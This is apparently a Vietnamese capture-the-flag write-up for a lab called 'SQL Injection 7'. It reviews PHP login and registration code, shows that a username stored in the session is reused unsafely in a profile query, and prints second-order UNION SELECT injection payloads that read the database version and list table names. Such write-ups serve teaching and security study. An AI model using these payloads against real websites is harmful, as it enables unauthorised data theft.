# SQL Injection 7  
## Thử thách về lỗi bảo mật SQL Injection
## Mục tiêu: Tìm secret trong database
# Phân tích
Có chức năng đăng nhập, đăng ký  
Web hỗ hộ trợ xem lại thôn tin email ki đăng ký.  
# Đọc code
Ở đây sử dụng Parameterized Queries/Prepared Statements.  
- Thực hiện truy vấn tham số hóa (Parameterized Queries/Prepared Statements): Các framework cung cấp cách sử dụng truy vấn tham số hóa để tách biệt giữa câu lệnh SQL và dữ liệu đầu vào. Điều này đảm bảo rằng dữ liệu người dùng sẽ không được xem là một phần của câu lệnh SQL, từ đó ngăn chặn SQL Injection.  
```
$sql = "SELECT username FROM users WHERE username=? and password=?";
$statement = $database->prepare($sql);
$statement->bind_param('ss', $_POST['username'], md5($_POST['password']));
$statement->execute();
$statement->store_result();
$statement->bind_result($result);
```
register:
```
} else {
    $sql = "INSERT INTO users(username, password, email) VALUES (?, ?, ?)";
    $statement = $database->prepare($sql);
    $statement->bind_param('sss', $_POST['username'], md5($_POST['password']), $_POST['email']);
    $statement->execute();
    $message = "Create successful";
```
login:  
<img src='./img/Screenshot 2025-08-03 at 23.36.50.png'>  
Có chức năng của `profile`:  
<img src='./img/Screenshot 2025-08-03 at 23.35.18.png'>  
- Ở dòng `17` login `$_SESSION["username"] = $result;` đây là kết quả từ câu query trước đó.
- `$_SESSION["username"]` lại được sử dung trong `profile`. dòng 9
-  dòng 12 profile: ở đây sử dụng lại `username` ở dòng 9 --> nếu thao túng được `username` để biến đổi câu sql ```SELECT email FROM users WHERE username='abc' UNION SELECT version() -- ' ```
- Thấy register ko có Validate gì cả .
# Khai thác
đăng ý 1 user/pass, với user là `abc' UNION SELECT version() -- `. --> đăng ký thành công. Khi nhấn check email.
<img src='./img/Screenshot 2025-08-03 at 23.47.55.png'>  
H tìm tất cả các `table_name`.  
Vì có 1 row nên sử dụng `GROUP_CONCAT(table_name)`, bị giới hạn user name nên ko where được `database()` hiện tại.  
```
a' UNION SELECT GROUP_CONCAT(table_name) FROM  information_schema.tables -- 
```
<img src='./img/Screenshot 2025-08-04 at 00.20.12.png'>